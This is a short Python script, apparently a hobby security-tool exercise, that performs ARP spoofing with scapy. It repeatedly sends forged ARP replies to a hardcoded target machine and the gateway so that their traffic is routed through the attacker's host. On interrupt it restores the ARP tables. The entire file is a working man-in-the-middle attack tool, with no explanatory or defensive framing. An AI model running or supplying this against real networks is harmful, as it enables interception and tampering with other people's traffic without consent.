#!/usr/bin/env python
# Please make sure to turn on port-forwarding before using.
# Debian based distro command: echo 1 > /proc/sys/net/ipV4/ip_forward

import sys
import scapy.all as scapy
import optparse
import time
import subprocess


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    arp_request_bc = broadcast / arp_request
    ans_list = scapy.srp(arp_request_bc, timeout=1, verbose=False)[0]
    return ans_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dst_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


def getArgs():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target-ip", dest="target_IP", help="Target machines IP")
    parser.add_option("-s", "--spoof-id", dest="spoofed_IP", help="IP that will be spoofed")
    (options, arguments) = parser.parse_args()
    return options


# subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
# options = getArgs()

target_ip = "192.168.0.109"
gateway_ip = "192.168.0.1"

try:
    sent_packs = 0
    while True:
        # spoof(options.target_IP, options.spoofed_IP)
        # spoof(options.spoofed_IP, options.target_IP)
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packs += 2
        print("\r[+]  Total Packets Sent: " + str(sent_packs)),
        sys.stdout.flush()
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C, Shutting down...\n"
          "Restoring ARP tables Please wait..\n"
          ),
    time.sleep(1)
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("Tables restored..Goodbye.")
